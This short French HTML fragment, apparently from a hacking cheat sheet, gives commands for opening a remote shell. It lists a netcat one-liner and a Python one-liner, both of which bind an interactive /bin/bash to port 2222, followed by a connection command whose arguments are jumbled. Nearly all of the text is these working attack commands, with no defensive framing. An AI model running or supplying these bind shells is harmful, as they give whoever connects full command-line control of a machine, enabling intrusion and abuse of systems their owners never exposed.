<h2>Obtenir un shell complet</h2>
<ul>Ouvrent un shell sur le port 2222 :
  <li>nc -lvp 2222 -e /bin/bash</li>
  <li>python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(('',2222));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);p=subprocess.call(['/bin/bash','-i'])"</li>
</ul>
On se connecte avec nc -nv 2222 adress port
